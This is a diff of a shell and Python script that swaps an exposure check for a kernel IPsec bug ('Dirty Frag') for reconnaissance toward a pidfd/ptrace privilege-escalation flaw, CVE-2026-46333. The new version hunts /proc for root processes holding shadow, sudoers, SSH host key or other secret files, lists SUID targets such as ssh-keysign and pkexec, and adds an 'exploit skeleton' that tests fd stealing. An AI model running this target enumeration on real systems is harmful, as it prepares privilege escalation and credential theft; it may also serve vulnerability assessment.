@@ -1,54 +1,94 @@
-# ── CHECK 1: Are the vulnerable modules loaded? ──
-lsmod | grep -E "^esp4|^esp6|^rxrpc"
-# Any output = attack surface exists
+# ── CHECK 1: ptrace scope ──
+cat /proc/sys/kernel/yama/ptrace_scope
+# 0 = fully open (worst) — any process can trace any other
+# 1 = restricted (partial protection)
+# 2 or 3 = protected
 
-# ── CHECK 2: Detailed module status ──
-for mod in esp4 esp6 rxrpc xfrm4_tunnel xfrm6_tunnel; do
-    if lsmod | grep -q "^$mod"; then
-        echo "[LOADED] $mod — VULNERABLE"
-    else
-        # Try loading it
-        modprobe $mod 2>/dev/null && echo "[LOADABLE] $mod — can be loaded"
-    fi
-done
-
-# ── CHECK 3: Is XFRM/IPsec subsystem active? ──
-cat /proc/net/xfrm_stat 2>/dev/null | head -10
-ip xfrm state list 2>/dev/null
-ip xfrm policy list 2>/dev/null
-
-# ── CHECK 4: Kernel config — compiled-in or module? ──
-cat /boot/config-$(uname -r) | grep -E "CONFIG_INET_ESP|CONFIG_RXRPC" 2>/dev/null
-# =m  = loadable module (can be loaded for attack)
-# =y  = compiled-in (always present — harder to disable)
-
-# ── CHECK 5: Check page cache drop defense ──
-# If we can drop caches, confirms kernel-level memory access
-cat /proc/sys/vm/drop_caches  # check current value
-cat /proc/sys/vm/vfs_cache_pressure  # memory pressure settings
-
-# ── VERIFY EXPLOITABILITY ──
+# ── CHECK 2: pidfd syscalls available? (needed for exploit) ──
 python3 << 'CHECK'
-import socket, struct
+import ctypes, os
 
-# Try creating raw socket for fragment crafting
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-    print("[+] Raw socket created — can craft malformed fragments")
-    s.close()
-except PermissionError:
-    print("[-] Raw socket blocked (needs root or CAP_NET_RAW)")
-    
-# Check if ESP protocol is accessible
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 50)  # IPPROTO_ESP=50
-    print("[+] ESP raw socket accessible — Dirty Frag surface confirmed")
-    s.close()
-except Exception as e:
-    print(f"[i] ESP socket: {e}")
+libc = ctypes.CDLL(None)
+
+# SYS_pidfd_open = 434 on x86_64
+# SYS_pidfd_getfd = 438 on x86_64
+pid = os.getpid()
+pidfd = libc.syscall(434, pid, 0)
+
+if pidfd >= 0:
+    print(f"[VULNERABLE] pidfd_open works — got fd {pidfd}")
+    # Try getfd on own process (safe test)
+    fd = libc.syscall(438, pidfd, 1, 0)
+    if fd >= 0:
+        print(f"[VULNERABLE] pidfd_getfd works — got fd {fd}")
+        print("[+] Full CVE-2026-46333 exploit chain is possible")
+else:
+    print("[-] pidfd_open failed — may not be exploitable")
 CHECK
 
-# ── DOCUMENT ──
-uname -r > /dev/shm/finding_DirtyFrag.txt
-lsmod | grep -E "esp4|esp6|rxrpc" >> /dev/shm/finding_DirtyFrag.txt
-echo "CVE-2026-43284 + CVE-2026-43500: Check module status above" >> /dev/shm/finding_DirtyFrag.txt
+# ── CHECK 3: Target processes with sensitive open FDs ──
+# Find root processes that have sensitive files open
+ls -la /proc/*/fd/ 2>/dev/null | grep -E "shadow|passwd|sudoers|ssh_host" | head -20
+
+# Find processes we might be able to trace
+python3 << 'TARGETS'
+import os, glob
+
+targets = []
+for pid_dir in glob.glob('/proc/[0-9]*/'):
+    try:
+        pid = int(pid_dir.split('/')[2])
+        # Check status
+        with open(f'/proc/{pid}/status') as f:
+            status = dict(line.strip().split(':\t', 1) 
+                         for line in f if ':\t' in line)
+        
+        uid = status.get('Uid', '').split()[0]
+        name = status.get('Name', 'unknown')
+        
+        # Check open files
+        fds = os.listdir(f'/proc/{pid}/fd') 
+        for fd in fds:
+            try:
+                link = os.readlink(f'/proc/{pid}/fd/{fd}')
+                if any(s in link for s in ['shadow','sudoers','ssh_host','secret','key']):
+                    print(f"[TARGET] PID={pid} Name={name} UID={uid} FD={fd}→{link}")
+                    targets.append((pid, fd, link))
+            except: pass
+    except: pass
+
+if not targets:
+    print("[i] No obvious sensitive FDs found in readable /proc entries")
+TARGETS
+
+# ── CHECK 4: Test on ssh-keysign (one of the 4 exploit targets) ──
+ls -la /usr/lib/openssh/ssh-keysign
+stat /usr/lib/openssh/ssh-keysign
+# SUID + owned by root = exploit target confirmed
+
+# ── CHECK 5: pkexec (another exploit target) ──
+ls -la /usr/bin/pkexec
+dpkg -l policykit-1 2>/dev/null | grep ^ii
+
+# ── EXPLOIT SKELETON (from public PoC logic) ──
+python3 << 'EXPLOIT'
+import ctypes, os, sys, time
+
+libc = ctypes.CDLL(None)
+
+# Find a process running as root that we can attach to
+# (The bug: during credential drop, ptrace window opens)
+print("[*] Looking for privilege-dropping root processes...")
+print("[*] Target binaries from Qualys PoC: chage, ssh-keysign, pkexec, accounts-daemon")
+print("[*] Full exploit available at: github.com/qualys-research/CVE-2026-46333")
+
+# Verify the core primitive works
+pid = os.getpid()
+pidfd = libc.syscall(434, pid, 0)  # pidfd_open
+if pidfd > 0:
+    print(f"[+] pidfd_open: WORKS (fd={pidfd})")
+    stolen = libc.syscall(438, pidfd, 0, 0)  # steal stdin
+    if stolen >= 0:
+        print(f"[+] pidfd_getfd: WORKS — full chain exploitable!")
+    libc.close(pidfd)
+EXPLOIT
